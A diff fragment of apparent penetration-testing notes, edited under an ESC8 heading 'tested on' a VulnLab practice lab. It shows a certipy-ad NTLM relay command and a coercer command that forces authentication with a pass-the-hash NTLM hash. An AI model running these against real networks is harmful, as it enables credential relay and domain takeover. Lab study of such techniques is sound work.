@@ -59,7 +59,7 @@ faketime '2024-12-19 08:12:01' certipy-ad auth -pfx administrator.pfx -dc-ip 10.
 ### ESC8
 Tested on Ifrit-VulnLab
 ```
-certipy-ad relay -target it-ifrit.vl
+certipy-ad relay -target 'http://172.16.41.17/'
 
 coercer coerce -u SQL07$@it-ifrit.vl --hashes :3565f3f4123cfbd6fb880a0978fffc81 -l 10.8.0.158 -t 172.16.41.210 --always-continue
 
